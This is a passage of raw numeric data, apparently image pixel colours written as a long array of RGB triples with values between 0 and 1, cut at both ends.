325,0.188},{0.561,0.325,0.196},{0.494,0.282,0.169},{0.667,0.482,0.4},{0.753,0.58,0.482},{0.667,0.455,0.325},{0.6,0.271,0.133},{0.471,0.196,0.102},{0.651,0.427,0.298},{0.647,0.341,0.251},{0.525,0.149,0.09},{0.565,0.255,0.204},{0.702,0.514,0.388},{0.733,0.439,0.376},
{0.667,0.29,0.208},{0.69,0.376,0.231},{0.722,0.416,0.243},{0.788,0.545,0.384},{0.796,0.561,0.424},{0.776,0.49,0.345},{0.698,0.373,0.212},{0.616,0.259,0.078},{0.584,0.208,0.027},{0.557,0.184,0.02},{0.502,0.157,0.02},{0.502,0.18,0.047},{0.522,0.192,0.047},{0.58,0.251,0.078},{0.631,0.298,0.102},{0.678,0.353,0.149},{0.706,0.392,0.188},{0.706,0.388,0.196},{0.706,0.408,0.208},{0.769,0.494,0.333},{0.812,0.553,0.416},{0.82,0.576,0.431},{0.851,0.639,0.51},{0.859,0.678,0.569},{0.839,0.682,0.549},{0.824,0.682,0.58},{0.761,0.647,0.608},{0.627,0.596,0.549},{0.561,0.498,0.439},{0.522,0.388,0.318},{0.447,0.302,0.227},{0.353,0.196,0.125},{0.302,0.157,0.094},{0.231,0.11,0.051},{0.231,0.125,0.09},{0.255,0.165,0.141},{0.275,0.208,0.18},{0.263,0.192,0.153},{0.322,0.255,0.212},{0.376,0.314,0.251},{0.455,0.4,0.325},{0.439,0.384,0.322},{0.443,0.412,0.349},{0.416,0.384,0.322},{0.486,0.459,0.384},{0.525,0.506,0.431},{0.541,0.506,0.455},{0.588,0.553,0.498},{0.612,0.576,0.494},{0.596,0.541,0.467},{0.624,0.573,0.49},{0.635,0.58,0.498},{0.604,0.541,0.459},
{0.565,0.502,0.4},{0.561,0.494,0.404},{0.643,0.573,0.471},{0.663,0.604,0.522},{0.596,0.498,0.392},{0.576,0.412,0.251},{0.627,0.443,0.263},{0.659,0.471,0.306},{0.675,0.49,0.329},{0.686,0.502,0.333},{0.694,0.51,0.337},{0.722,0.545,0.369},{0.733,0.557,0.392},{0.741,0.565,0.4},{0.745,0.573,0.404},{0.741,0.569,0.4},{0.745,0.576,0.408},{0.749,0.576,0.404},{0.745,0.573,0.4},{0.745,0.565,0.392},{0.749,0.565,0.392},{0.745,0.565,0.384},{0.753,0.557,0.38},{0.741,0.549,0.365},{0.388,0.263,0.18},{0.388,0.263,0.18},{0.804,0.671,0.62},{0.878,0.765,0.686},{0.886,0.784,0.706},{0.878,0.737,0.627},{0.804,0.608,0.427},{0.667,0.42,0.251},{0.588,0.345,0.192},{0.494,0.271,0.137},{0.478,0.251,0.137},{0.627,0.447,0.357},{0.761,0.608,0.518},{0.671,0.467,0.357},{0.545,0.275,0.173},{0.447,0.157,0.078},{0.522,0.247,0.125},{0.655,0.392,0.243},{0.616,0.282,0.2},{0.525,0.161,0.086},{0.671,0.424,0.353},{0.776,0.616,0.486},{0.78,0.49,0.416},{0.678,0.275,0.2},{0.69,0.365,0.216},{0.725,0.42,0.235},{0.808,0.553,0.392},{0.843,0.616,0.475},{0.788,0.51,0.361},
{0.714,0.388,0.227},{0.616,0.255,0.075},{0.576,0.2,0.02},{0.545,0.173,0.008},{0.494,0.153,0.016},{0.494,0.169,0.039},{0.525,0.196,0.051},{0.58,0.251,0.075},{0.631,0.294,0.102},{0.678,0.353,0.149},{0.694,0.38,0.176},{0.694,0.373,0.188},{0.655,0.353,0.169},{0.757,0.482,0.333},{0.804,0.541,0.404},{0.804,0.561,0.42},{0.827,0.62,0.486},{0.843,0.659,0.553},{0.8,0.655,0.553},{0.757,0.663,0.624},{0.698,0.651,0.592},{0.714,0.58,0.522},{0.671,0.51,0.42},{0.667,0.439,0.337},{0.627,0.396,0.278},{0.592,0.349,0.224},{0.529,0.275,0.157},{0.482,0.227,0.114},{0.396,0.173,0.078},{0.325,0.141,0.067},{0.231,0.102,0.039},{0.196,0.114,0.071},{0.188,0.133,0.102},{0.239,0.192,0.153},{0.294,0.251,0.192},{0.373,0.329,0.267},{0.376,0.325,0.263},{0.396,0.345,0.278},{0.482,0.435,0.361},{0.502,0.455,0.38},{0.486,0.439,0.369},{0.51,0.463,0.392},{0.643,0.608,0.525},{0.569,0.518,0.439},{0.588,0.525,0.427},{0.631,0.569,0.471},{0.643,0.588,0.486},{0.643,0.569,0.459},{0.655,0.569,0.49},{0.624,0.537,0.412},{0.643,0.573,0.475},{0.651,0.561,0.459},{0.663,0.561,0.435},
{0.573,0.42,0.259},{0.651,0.463,0.294},{0.671,0.486,0.322},{0.678,0.494,0.329},{0.69,0.506,0.333},{0.69,0.518,0.337},{0.71,0.533,0.373},{0.725,0.549,0.384},{0.729,0.557,0.388},{0.722,0.561,0.388},{0.722,0.569,0.392},{0.729,0.561,0.384},{0.722,0.549,0.373},{0.729,0.549,0.376},{0.741,0.557,0.388},{0.729,0.549,0.373},{0.729,0.537,0.357},{0.729,0.533,0.353},{0.416,0.282,0.192},{0.416,0.282,0.192},{0.808,0.682,0.608},{0.886,0.78,0.69},{0.886,0.784,0.706},{0.859,0.729,0.624},{0.827,0.663,0.494},{0.761,0.522,0.333},{0.698,0.427,0.251},{0.643,0.412,0.263},{0.678,0.502,0.396},{0.773,0.631,0.553},{0.643,0.431,0.302},{0.561,0.306,0.192},{0.153,0.039,0.024},{0.384,0.153,0.114},{0.565,0.29,0.161},{0.682,0.388,0.227},{0.616,0.259,0.176},{0.545,0.169,0.11},{0.71,0.471,0.396},{0.871,0.729,0.596},{0.792,0.518,0.427},{0.702,0.298,0.212},{0.675,0.341,0.196},{0.729,0.42,0.231},{0.816,0.557,0.396},{0.863,0.639,0.494},{0.808,0.533,0.384},{0.714,0.392,0.227},{0.62,0.251,0.082},{0.573,0.192,0.02},{0.545,0.176,0.02},{0.486,0.149,0.02},{0.494,0.165,0.031},
{0.525,0.196,0.043},{0.576,0.247,0.063},{0.627,0.29,0.098},{0.675,0.345,0.145},{0.675,0.357,0.157},{0.655,0.341,0.145},{0.651,0.353,0.169},{0.761,0.486,0.341},{0.788,0.525,0.384},{0.808,0.549,0.416},{0.82,0.616,0.478},{0.824,0.639,0.522},{0.765,0.663,0.592},{0.757,0.69,0.647},{0.749,0.612,0.553},{0.737,0.588,0.518},{0.733,0.553,0.463},{0.718,0.518,0.412},{0.686,0.475,0.365},{0.651,0.427,0.31},{0.624,0.388,0.267},{0.576,0.325,0.196},{0.533,0.286,0.145},{0.486,0.235,0.106},{0.443,0.196,0.082},{0.392,0.161,0.059},{0.318,0.125,0.059},{0.251,0.125,0.067},{0.192,0.118,0.086},{0.192,0.122,0.094},{0.341,0.267,0.22},{0.471,0.396,0.337},{0.459,0.384,0.31},{0.455,0.4,0.322},{0.49,0.439,0.369},{0.467,0.416,0.341},{0.49,0.443,0.353},{0.51,0.459,0.369},{0.522,0.447,0.357},{0.561,0.482,0.396},{0.58,0.506,0.416},{0.631,0.537,0.447},{0.604,0.51,0.416},{0.569,0.443,0.29},{0.608,0.435,0.267},{0.624,0.451,0.282},{0.643,0.471,0.306},{0.659,0.49,0.333},{0.651,0.467,0.302},{0.659,0.475,0.31},{0.671,0.486,0.322},{0.671,0.486,0.322},{0.686,0.506,0.337},
{0.694,0.518,0.353},{0.714,0.533,0.369},{0.714,0.537,0.373},{0.71,0.533,0.369},{0.71,0.533,0.369},{0.71,0.537,0.365},{0.725,0.553,0.376},{0.718,0.537,0.365},{0.729,0.545,0.373},{0.718,0.537,0.357},{0.718,0.529,0.349},{0.725,0.537,0.353},{0.467,0.325,0.192},{0.467,0.325,0.192},{0.78,0.639,0.533},{0.878,0.773,0.678},{0.902,0.792,0.718},{0.882,0.765,0.663},{0.851,0.698,0.541},{0.816,0.604,0.439},{0.82,0.616,0.482},{0.847,0.686,0.592},{0.859,0.741,0.675},{0.757,0.58,0.475},{0.635,0.38,0.251},{0.569,0.286,0.184},{0.392,0.161,0.102},{0.514,0.235,0.153},{0.576,0.294,0.176},{0.694,0.392,0.235},{0.655,0.306,0.204},{0.553,0.153,0.098},{0.675,0.404,0.322},{0.839,0.686,0.545},{0.808,0.518,0.435},{0.722,0.314,0.227},{0.694,0.361,0.22},{0.741,0.435,0.251},{0.827,0.592,0.439},{0.875,0.671,0.533},{0.855,0.6,0.451},{0.722,0.388,0.216},{0.616,0.239,0.075},{0.565,0.184,0.02},{0.533,0.165,0.02},{0.478,0.149,0.027},{0.494,0.161,0.024},{0.533,0.204,0.039},{0.584,0.251,0.063},{0.627,0.29,0.098},{0.667,0.337,0.141},{0.671,0.353,0.157},{0.678,0.369,0.161},
{0.686,0.396,0.216},{0.753,0.486,0.337},{0.788,0.522,0.38},{0.8,0.545,0.412},{0.831,0.592,0.482},{0.765,0.635,0.545},{0.761,0.675,0.643},{0.773,0.643,0.6},{0.765,0.627,0.576},{0.761,0.612,0.537},{0.749,0.573,0.482},{0.725,0.533,0.431},{0.698,0.502,0.388},{0.671,0.455,0.333},{0.659,0.427,0.298},{0.62,0.369,0.231},{0.58,0.329,0.192},{0.537,0.282,0.153},{0.494,0.243,0.118},{0.455,0.204,0.086},{0.424,0.184,0.082},{0.361,0.165,0.067},{0.271,0.11,0.039},{0.165,0.051,0.016},{0.165,0.047,0.024},{0.2,0.086,0.039},{0.227,0.11,0.035},{0.337,0.196,0.106},{0.388,0.239,0.133},{0.459,0.31,0.192},{0.502,0.365,0.243},{0.549,0.416,0.294},{0.569,0.443,0.322},{0.608,0.478,0.357},{0.608,0.502,0.388},{0.62,0.514,0.404},{0.667,0.573,0.455},{0.659,0.545,0.427},{0.647,0.482,0.322},{0.667,0.498,0.333},{0.675,0.49,0.325},{0.671,0.486,0.325},{0.671,0.486,0.322},{0.678,0.498,0.333},{0.678,0.494,0.329},{0.682,0.498,0.333},{0.69,0.506,0.341},{0.69,0.51,0.345},{0.706,0.525,0.361},{0.702,0.525,0.361},{0.698,0.522,0.357},{0.718,0.541,0.373},{0.718,0.545,0.373},
{0.718,0.545,0.369},{0.71,0.529,0.357},{0.722,0.541,0.369},{0.71,0.522,0.345},{0.714,0.525,0.345},{0.698,0.506,0.322},{0.506,0.373,0.212},{0.506,0.373,0.212},{0.737,0.557,0.427},{0.878,0.749,0.651},{0.898,0.784,0.698},{0.902,0.78,0.69},{0.89,0.741,0.596},{0.851,0.671,0.537},{0.886,0.729,0.635},{0.929,0.812,0.753},{0.906,0.808,0.745},{0.792,0.588,0.463},{0.682,0.412,0.275},{0.624,0.298,0.157},{0.584,0.243,0.114},{0.592,0.263,0.149},{0.616,0.306,0.188},{0.714,0.427,0.263},{0.733,0.4,0.275},{0.584,0.184,0.102},{0.722,0.49,0.392},{0.906,0.796,0.675},{0.835,0.608,0.525},{0.737,0.349,0.255},{0.725,0.4,0.255},{0.761,0.471,0.286},{0.855,0.635,0.494},{0.878,0.694,0.576},{0.851,0.624,0.471},{0.745,0.396,0.216},{0.616,0.243,0.059},{0.557,0.18,0.012},{0.525,0.157,0.012},{0.471,0.141,0.016},{0.49,0.157,0.02},{0.541,0.208,0.047},{0.588,0.259,0.071},{0.647,0.31,0.114},{0.682,0.353,0.157},{0.702,0.384,0.184},{0.702,0.396,0.192},{0.702,0.412,0.231},{0.765,0.498,0.349},{0.788,0.522,0.38},{0.796,0.537,0.404},{0.773,0.616,0.51},{0.769,0.675,0.62},
{0.773,0.663,0.62},{0.788,0.671,0.62},{0.784,0.651,0.6},{0.761,0.616,0.537},{0.741,0.576,0.482},{0.722,0.541,0.439},{0.706,0.522,0.404},{0.686,0.478,0.357},{0.667,0.435,0.31},{0.627,0.38,0.243},{0.596,0.345,0.208},{0.569,0.318,0.18},{0.522,0.275,0.137},{0.486,0.239,0.102},{0.455,0.216,0.086},{0.427,0.2,0.078},{0.373,0.18,0.051},{0.302,0.125,0.047},{0.224,0.071,0.016},{0.212,0.063,0.004},{0.259,0.09,0.02},{0.322,0.129,0.035},{0.373,0.169,0.047},{0.42,0.216,0.078},{0.455,0.251,0.09},{0.506,0.306,0.141},{0.545,0.353,0.18},{0.584,0.396,0.22},{0.6,0.435,0.255},{0.624,0.455,0.282},{0.659,0.482,0.314},{0.675,0.502,0.349},{0.686,0.529,0.373},{0.69,0.533,0.376},{0.694,0.518,0.357},{0.686,0.51,0.353},{0.682,0.502,0.337},{0.694,0.51,0.345},{0.698,0.514,0.349},{0.694,0.514,0.349},{0.694,0.51,0.345},{0.702,0.518,0.353},{0.702,0.525,0.361},{0.706,0.529,0.365},{0.71,0.537,0.369},{0.706,0.529,0.365},{0.718,0.541,0.369},{0.714,0.541,0.365},{0.702,0.525,0.349},{0.698,0.518,0.345},{0.702,0.518,0.333},{0.702,0.514,0.333},{0.698,0.498,0.318},
{0.608,0.463,0.31},{0.608,0.463,0.31},{0.69,0.475,0.325},{0.851,0.682,0.549},{0.898,0.761,0.663},{0.89,0.765,0.675},{0.871,0.725,0.588},{0.867,0.686,0.549},{0.906,0.757,0.659},{0.925,0.78,0.69},{0.929,0.788,0.718},{0.875,0.718,0.608},{0.749,0.467,0.318},{0.651,0.325,0.176},{0.424,0.09,0.035},{0.584,0.271,0.176},{0.655,0.333,0.196},{0.8,0.541,0.408},{0.804,0.525,0.392},{0.596,0.2,0.098},{0.584,0.271,0.212},{0.875,0.725,0.643},{0.875,0.686,0.643},{0.78,0.455,0.353},{0.769,0.459,0.29},{0.792,0.522,0.341},{0.851,0.639,0.494},{0.867,0.678,0.545},{0.839,0.592,0.416},{0.718,0.38,0.161},{0.624,0.263,0.047},{0.545,0.184,0.008},{0.51,0.157,0.012},{0.475,0.141,0.02},{0.486,0.165,0.016},{0.545,0.216,0.035},{0.608,0.271,0.075},{0.663,0.333,0.114},{0.694,0.361,0.133},{0.702,0.373,0.153},{0.69,0.373,0.161},{0.694,0.4,0.224},{0.769,0.498,0.349},{0.78,0.502,0.357},{0.749,0.545,0.431},{0.78,0.706,0.655},{0.78,0.667,0.62},{0.804,0.686,0.643},{0.788,0.671,0.627},{0.784,0.655,0.612},{0.769,0.627,0.557},{0.757,0.588,0.506},{0.725,0.545,0.447},
{0.706,0.522,0.416},{0.686,0.478,0.361},{0.659,0.431,0.31},{0.643,0.396,0.271},{0.612,0.353,0.235},{0.58,0.329,0.196},{0.549,0.302,0.165},{0.518,0.271,0.133},{0.482,0.243,0.106},{0.447,0.227,0.078},{0.416,0.216,0.071},{0.38,0.176,0.071},{0.314,0.133,0.035},{0.263,0.09,0.016},{0.267,0.086,0.004},{0.306,0.11,0.016},{0.349,0.153,0.043},{0.408,0.204,0.059},{0.443,0.239,0.086},{0.502,0.302,0.133},{0.541,0.349,0.18},{0.58,0.408,0.235},{0.62,0.443,0.278},{0.659,0.478,0.325},{0.675,0.514,0.349},{0.71,0.545,0.38},{0.714,0.549,0.404},{0.718,0.553,0.412},{0.718,0.549,0.408},{0.714,0.545,0.404},{0.722,0.537,0.388},{0.725,0.537,0.388},{0.71,0.529,0.373},{0.714,0.545,0.38},{0.706,0.533,0.369},{0.702,0.525,0.365},{0.706,0.529,0.369},{0.718,0.537,0.376},{0.718,0.541,0.376},{0.718,0.541,0.376},{0.733,0.549,0.38},{0.714,0.533,0.357},{0.722,0.529,0.361},{0.71,0.518,0.349},{0.706,0.518,0.333},{0.698,0.51,0.318},{0.698,0.506,0.318},{0.714,0.573,0.408},{0.714,0.573,0.408},{0.643,0.443,0.286},{0.82,0.608,0.455},{0.898,0.757,0.663},{0.898,0.773,0.682},
{0.878,0.729,0.596},{0.839,0.627,0.471},{0.827,0.604,0.467},{0.808,0.584,0.447},{0.71,0.506,0.408},{0.886,0.737,0.671},{0.824,0.604,0.467},{0.706,0.424,0.247},{0.569,0.263,0.153},{0.416,0.106,0.055},{0.584,0.216,0.102},{0.812,0.584,0.49},{0.898,0.678,0.545},{0.635,0.247,0.129},{0.537,0.153,0.11},{0.8,0.6,0.529},{0.847,0.651,0.588},{0.816,0.545,0.42},{0.808,0.541,0.361},{0.8,0.557,0.365},{0.843,0.635,0.475},{0.871,0.651,0.482},{0.8,0.525,0.31},{0.725,0.392,0.161},{0.604,0.255,0.043},{0.549,0.188,0.012},{0.502,0.149,0.004},{0.471,0.133,0.016},{0.482,0.161,0.012},{0.549,0.224,0.039},{0.62,0.282,0.082},{0.659,0.325,0.106},{0.671,0.337,0.11},{0.667,0.337,0.118},{0.647,0.329,0.11},{0.675,0.384,0.208},{0.761,0.486,0.349},{0.722,0.494,0.361},{0.761,0.647,0.584},{0.769,0.667,0.616},{0.796,0.686,0.624},{0.808,0.69,0.647},{0.8,0.682,0.639},{0.796,0.675,0.627},{0.776,0.639,0.569},{0.757,0.588,0.506},{0.729,0.549,0.451},{0.706,0.518,0.412},{0.69,0.486,0.369},{0.651,0.435,0.31},{0.624,0.392,0.263},{0.624,0.365,0.243},{0.588,0.341,0.204},
{0.553,0.306,0.169},{0.541,0.294,0.157},{0.51,0.267,0.125},{0.467,0.243,0.098},{0.447,0.224,0.094},{0.424,0.204,0.075},{0.384,0.176,0.055},{0.333,0.133,0.039},{0.298,0.102,0.016},{0.31,0.106,0.012},{0.329,0.133,0.024},{0.376,0.176,0.031},{0.424,0.22,0.067},{0.475,0.275,0.106},{0.541,0.333,0.169},{0.58,0.392,0.22},{0.624,0.447,0.282},{0.675,0.498,0.341},{0.69,0.529,0.376},{0.718,0.557,0.408},{0.737,0.569,0.427},{0.741,0.576,0.427},{0.733,0.576,0.424},{0.714,0.561,0.412},{0.722,0.553,0.4},{0.729,0.553,0.4},{0.729,0.545,0.388},{0.718,0.549,0.384},{0.722,0.549,0.388},{0.722,0.545,0.384},{0.725,0.545,0.384},{0.729,0.545,0.384},{0.718,0.541,0.373},{0.714,0.537,0.373},{0.718,0.533,0.365},{0.714,0.529,0.357},{0.729,0.537,0.369},{0.722,0.529,0.361},{0.714,0.522,0.345},{0.71,0.522,0.341},{0.698,0.502,0.318},{0.757,0.627,0.443},{0.757,0.627,0.443},{0.612,0.447,0.298},{0.784,0.584,0.435},{0.886,0.745,0.624},{0.914,0.8,0.725},{0.886,0.733,0.604},{0.714,0.49,0.333},{0.663,0.408,0.255},{0.655,0.4,0.255},{0.62,0.388,0.255},{0.482,0.278,0.176},
{0.557,0.357,0.302},{0.847,0.651,0.561},{0.878,0.647,0.506},{0.769,0.451,0.298},{0.675,0.318,0.184},{0.851,0.651,0.58},{0.914,0.761,0.647},{0.8,0.486,0.333},{0.549,0.157,0.063},{0.631,0.345,0.267},{0.745,0.486,0.404},{0.812,0.569,0.443},{0.835,0.592,0.412},{0.816,0.58,0.396},{0.82,0.584,0.408},{0.796,0.541,0.341},{0.773,0.482,0.247},{0.69,0.373,0.141},{0.592,0.255,0.035},{0.545,0.192,0.008},{0.498,0.149,0.004},{0.467,0.129,0.012},{0.471,0.153,0.008},{0.557,0.227,0.031},{0.616,0.267,0.067},{0.624,0.29,0.071},{0.612,0.278,0.071},{0.576,0.251,0.059},{0.557,0.251,0.063},{0.655,0.361,0.192},{0.741,0.498,0.365},{0.698,0.588,0.502},{0.765,0.698,0.651},{0.808,0.694,0.639},{0.816,0.706,0.655},{0.82,0.702,0.659},{0.804,0.686,0.643},{0.788,0.675,0.616},{0.78,0.643,0.565},{0.761,0.592,0.51},{0.741,0.561,0.463},{0.702,0.51,0.408},{0.69,0.486,0.38},{0.647,0.447,0.322},{0.627,0.412,0.278},{0.616,0.376,0.247},{0.584,0.337,0.208},{0.565,0.325,0.192},{0.545,0.306,0.169},{0.529,0.282,0.149},{0.482,0.263,0.122},{0.471,0.247,0.114},{0.443,0.22,0.082},
{0.416,0.2,0.075},{0.388,0.176,0.055},{0.345,0.137,0.043},{0.329,0.114,0.02},{0.329,0.122,0.016},{0.353,0.145,0.016},{0.392,0.184,0.035},{0.451,0.247,0.086},{0.51,0.298,0.137},{0.569,0.365,0.2},{0.624,0.435,0.267},{0.671,0.494,0.333},{0.698,0.537,0.396},{0.714,0.565,0.416},{0.745,0.58,0.431},{0.753,0.588,0.439},{0.749,0.592,0.439},{0.753,0.596,0.443},{0.749,0.584,0.431},{0.741,0.576,0.42},{0.741,0.565,0.412},{0.737,0.565,0.408},{0.733,0.561,0.4},{0.737,0.557,0.4},{0.749,0.565,0.404},{0.737,0.553,0.392},{0.733,0.549,0.388},{0.714,0.537,0.376},{0.722,0.541,0.369},{0.718,0.533,0.361},{0.71,0.525,0.353},{0.718,0.529,0.361},{0.71,0.518,0.349},{0.71,0.518,0.349},{0.702,0.51,0.333},{0.796,0.69,0.518},{0.796,0.69,0.518},{0.6,0.459,0.29},{0.757,0.569,0.443},{0.859,0.69,0.573},{0.933,0.816,0.753},{0.902,0.765,0.639},{0.592,0.365,0.22},{0.588,0.325,0.176},{0.643,0.4,0.259},{0.58,0.333,0.196},{0.416,0.208,0.114},{0.278,0.133,0.09},{0.467,0.298,0.243},{0.89,0.718,0.616},{0.875,0.69,0.557},{0.824,0.58,0.435},{0.847,0.647,0.545},
{0.894,0.749,0.631},{0.894,0.698,0.541},{0.675,0.325,0.173},{0.369,0.067,0.031},{0.396,0.192,0.169},{0.827,0.608,0.482},{0.839,0.604,0.447},{0.82,0.569,0.4},{0.78,0.506,0.31},{0.753,0.459,0.247},{0.722,0.416,0.188},{0.643,0.325,0.098},{0.596,0.255,0.035},{0.553,0.2,0.012},{0.494,0.149,0.004},{0.455,0.125,0.008},{0.475,0.149,0.004},{0.541,0.208,0.012},{0.565,0.216,0.027},{0.537,0.208,0.02},{0.498,0.184,0.016},{0.467,0.169,0.012},{0.475,0.2,0.027},{0.616,0.325,0.169},{0.686,0.525,0.408},{0.792,0.733,0.651},{0.804,0.706,0.651},{0.835,0.722,0.667},{0.835,0.722,0.671},{0.827,0.714,0.667},{0.812,0.694,0.655},{0.784,0.678,0.612},{0.769,0.631,0.545},{0.761,0.596,0.502},{0.737,0.561,0.455},{0.702,0.518,0.412},{0.69,0.494,0.388},{0.667,0.471,0.349},{0.643,0.435,0.302},{0.6,0.38,0.243},{0.588,0.353,0.22},{0.569,0.333,0.2},{0.541,0.306,0.173},{0.529,0.294,0.161},{0.498,0.263,0.129},{0.478,0.247,0.114},{0.467,0.235,0.102},{0.443,0.22,0.086},{0.42,0.2,0.067},{0.38,0.173,0.055},{0.349,0.141,0.027},{0.337,0.125,0.02},{0.341,0.133,0.012},
{0.369,0.157,0.024},{0.42,0.208,0.059},{0.463,0.255,0.09},{0.533,0.322,0.161},{0.604,0.404,0.235},{0.659,0.475,0.314},{0.706,0.537,0.396},{0.733,0.584,0.431},{0.753,0.592,0.443},{0.757,0.592,0.443},{0.753,0.588,0.439},{0.753,0.588,0.439},{0.757,0.592,0.435},{0.753,0.588,0.431},{0.749,0.576,0.424},{0.753,0.58,0.427},{0.749,0.584,0.42},{0.737,0.557,0.396},{0.745,0.557,0.396},{0.737,0.553,0.388},{0.737,0.549,0.392},{0.718,0.537,0.376},{0.718,0.537,0.369},{0.725,0.541,0.369},{0.725,0.541,0.369},{0.722,0.541,0.369},{0.706,0.518,0.349},{0.71,0.518,0.349},{0.706,0.51,0.337},{0.851,0.773,0.624},{0.851,0.773,0.624},{0.765,0.635,0.451},{0.561,0.384,0.29},{0.827,0.624,0.518},{0.929,0.796,0.725},{0.867,0.757,0.635},{0.584,0.357,0.224},{0.651,0.373,0.231},{0.686,0.463,0.322},{0.624,0.4,0.267},{0.384,0.251,0.173},{0.133,0.082,0.075},{0.275,0.118,0.082},{0.757,0.541,0.463},{0.859,0.651,0.514},{0.776,0.502,0.345},{0.698,0.404,0.239},{0.788,0.549,0.404},{0.855,0.655,0.498},{0.773,0.518,0.302},{0.533,0.216,0.075},{0.522,0.306,0.216},{0.788,0.569,0.396},
{0.796,0.573,0.404},{0.769,0.506,0.298},{0.753,0.447,0.216},{0.71,0.388,0.165},{0.655,0.333,0.106},{0.624,0.29,0.067},{0.592,0.247,0.031},{0.549,0.196,0.012},{0.475,0.133,0.004},{0.42,0.11,0.004},{0.447,0.137,0.012},{0.463,0.161,0.012},{0.435,0.145,0.016},{0.396,0.114,0.004},{0.404,0.125,0.012},{0.416,0.149,0.02},{0.42,0.157,0.024},{0.537,0.298,0.184},{0.737,0.675,0.6},{0.796,0.706,0.631},{0.835,0.714,0.655},{0.855,0.741,0.686},{0.847,0.733,0.678},{0.824,0.706,0.663},{0.82,0.702,0.659},{0.788,0.682,0.616},{0.773,0.635,0.545},{0.765,0.604,0.498},{0.729,0.557,0.439},{0.714,0.541,0.427},{0.69,0.502,0.396},{0.671,0.475,0.353},{0.639,0.431,0.298},{0.608,0.4,0.259},{0.588,0.365,0.227},{0.569,0.333,0.204},{0.541,0.31,0.176},{0.529,0.302,0.165},{0.522,0.263,0.137},{0.498,0.251,0.122},{0.486,0.239,0.11},{0.463,0.224,0.082},{0.439,0.204,0.067},{0.404,0.192,0.067},{0.38,0.169,0.043},{0.365,0.153,0.043},{0.349,0.137,0.016},{0.361,0.145,0.024},{0.384,0.173,0.035},{0.435,0.224,0.067},{0.494,0.282,0.122},{0.573,0.369,0.204},{0.635,0.439,0.282},
{0.694,0.518,0.369},{0.729,0.569,0.42},{0.753,0.592,0.443},{0.753,0.588,0.439},{0.753,0.592,0.443},{0.753,0.592,0.443},{0.761,0.596,0.443},{0.761,0.596,0.439},{0.757,0.584,0.431},{0.749,0.576,0.424},{0.753,0.584,0.424},{0.741,0.561,0.4},{0.737,0.553,0.388},{0.737,0.553,0.388},{0.737,0.553,0.392},{0.725,0.541,0.38},{0.725,0.541,0.373},{0.725,0.541,0.369},{0.722,0.541,0.365},{0.718,0.533,0.361},{0.706,0.518,0.349},{0.698,0.506,0.337},{0.69,0.49,0.318},{0.867,0.788,0.718},{0.867,0.788,0.718},{0.831,0.725,0.541},{0.533,0.388,0.247},{0.659,0.463,0.357},{0.855,0.671,0.541},{0.914,0.792,0.682},{0.706,0.522,0.392},{0.722,0.478,0.329},{0.776,0.584,0.478},{0.725,0.553,0.443},{0.486,0.376,0.314},{0.106,0.075,0.059},{0.188,0.086,0.063},{0.573,0.361,0.298},{0.886,0.682,0.565},{0.812,0.545,0.376},{0.718,0.392,0.227},{0.651,0.333,0.165},{0.686,0.4,0.231},{0.729,0.451,0.251},{0.651,0.349,0.161},{0.741,0.467,0.286},{0.776,0.522,0.333},{0.761,0.486,0.286},{0.749,0.447,0.22},{0.71,0.388,0.149},{0.671,0.329,0.098},{0.635,0.29,0.071},{0.616,0.259,0.051},
{0.569,0.22,0.024},{0.49,0.169,0.008},{0.42,0.114,0.008},{0.353,0.086,0.008},{0.341,0.086,0.008},{0.29,0.071,0.008},{0.267,0.071,0.012},{0.271,0.071,0.008},{0.302,0.086,0.008},{0.376,0.129,0.024},{0.396,0.145,0.031},{0.565,0.443,0.345},{0.753,0.682,0.588},{0.824,0.702,0.655},{0.855,0.741,0.682},{0.855,0.741,0.682},{0.851,0.733,0.678},{0.835,0.718,0.667},{0.82,0.706,0.651},{0.776,0.671,0.596},{0.765,0.631,0.541},{0.761,0.608,0.498},{0.733,0.569,0.451},{0.71,0.541,0.427},{0.694,0.51,0.4},{0.675,0.475,0.353},{0.651,0.439,0.306},{0.62,0.412,0.267},{0.596,0.369,0.235},{0.565,0.329,0.208},{0.549,0.314,0.192},{0.529,0.282,0.153},{0.522,0.263,0.137},{0.506,0.247,0.122},{0.498,0.243,0.118},{0.478,0.231,0.094},{0.459,0.212,0.075},{0.424,0.196,0.059},{0.408,0.184,0.047},{0.384,0.169,0.035},{0.369,0.153,0.02},{0.369,0.149,0.02},{0.376,0.157,0.027},{0.412,0.192,0.043},{0.467,0.251,0.094},{0.541,0.337,0.176},{0.616,0.412,0.251},{0.663,0.482,0.322},{0.729,0.569,0.42},{0.741,0.596,0.435},{0.757,0.616,0.451},{0.753,0.608,0.443},{0.753,0.608,0.443},
{0.749,0.588,0.439},{0.757,0.592,0.443},{0.761,0.588,0.435},{0.749,0.573,0.42},{0.745,0.561,0.404},{0.749,0.549,0.392},{0.753,0.565,0.404},{0.745,0.561,0.404},{0.737,0.553,0.396},{0.733,0.541,0.384},{0.741,0.549,0.392},{0.733,0.549,0.384},{0.722,0.545,0.373},{0.725,0.537,0.369},{0.714,0.522,0.353},{0.698,0.506,0.337},{0.698,0.502,0.329},{0.792,0.675,0.675},{0.792,0.675,0.675},{0.875,0.8,0.663},{0.753,0.635,0.451},{0.298,0.165,0.082},{0.627,0.427,0.322},{0.878,0.702,0.584},{0.812,0.655,0.537},{0.792,0.608,0.471},{0.827,0.667,0.573},{0.804,0.671,0.596},{0.706,0.588,0.522},{0.157,0.106,0.075},{0.2,0.106,0.078},{0.502,0.29,0.224},{0.902,0.722,0.62},{0.855,0.627,0.478},{0.788,0.478,0.314},{0.702,0.369,0.188},{0.627,0.29,0.102},{0.6,0.278,0.102},{0.671,0.349,0.165},{0.737,0.451,0.239},{0.776,0.51,0.294},{0.757,0.459,0.235},{0.694,0.361,0.137},{0.678,0.333,0.11},{0.643,0.286,0.055},{0.624,0.259,0.031},{0.576,0.227,0.02},{0.537,0.188,0.008},{0.455,0.137,0.008},{0.243,0.059,0.008},{0.196,0.039,0.016},{0.224,0.078,0.035},{0.2,0.047,0.004},
